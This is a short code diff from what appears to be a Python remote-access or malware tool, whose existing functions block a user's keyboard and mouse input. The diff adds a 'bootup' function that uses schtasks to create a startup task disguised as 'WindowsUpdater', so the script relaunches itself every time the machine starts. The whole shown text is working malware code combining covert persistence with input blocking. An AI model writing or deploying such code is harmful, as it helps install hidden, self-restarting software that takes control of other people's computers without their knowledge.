@@ -90,3 +90,10 @@ def block_input():
 def unblock_input():
   kb_listener.stop()
   m_listener.stop()
+
+def bootup(): #USING SCHEDULED TASKS
+  try:
+    os.popen(f"schtasks /create /sc ONSTART /tn WindowsUpdater /tr {os.path.dirname(os.path.abspath(__file__))}\\main.py")
+  except Exception as e:
+    print(e)
+    return "Error creating task."
